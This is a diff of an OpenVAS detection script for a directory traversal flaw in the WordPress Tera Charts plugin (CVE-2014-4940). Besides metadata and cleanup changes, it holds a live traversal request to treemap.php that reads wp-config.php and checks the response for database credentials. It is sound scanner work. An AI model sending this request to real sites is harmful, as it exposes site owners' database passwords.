@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_tera-charts_dir_trav_vuln.nasl 6497 2017-06-30 09:58:54Z teissa $
+# $Id: gb_wordpress_tera-charts_dir_trav_vuln.nasl 9998 2018-05-29 08:15:38Z cfischer $
 #
 # Wordpress Tera Charts Multiple Directory Traversal Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805123");
-  script_version("$Revision: 6497 $");
+  script_version("$Revision: 9998 $");
   script_cve_id("CVE-2014-4940");
   script_bugtraq_id(68662);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-06-30 11:58:54 +0200 (Fri, 30 Jun 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-29 10:15:38 +0200 (Tue, 29 May 2018) $");
   script_tag(name:"creation_date", value:"2015-01-13 12:03:15 +0530 (Tue, 13 Jan 2015)");
   script_name("Wordpress Tera Charts Multiple Directory Traversal Vulnerability");
 
@@ -72,36 +72,21 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Check Host Supports PHP
-if(!can_host_php(port:http_port)){
-  exit(0);
-}
-
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-## Vulnerable URL
 url = dir + '/wp-content/plugins/tera-charts/charts'
           + '/treemap.php?fn=../../../wp-config.php';
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD")))
 {
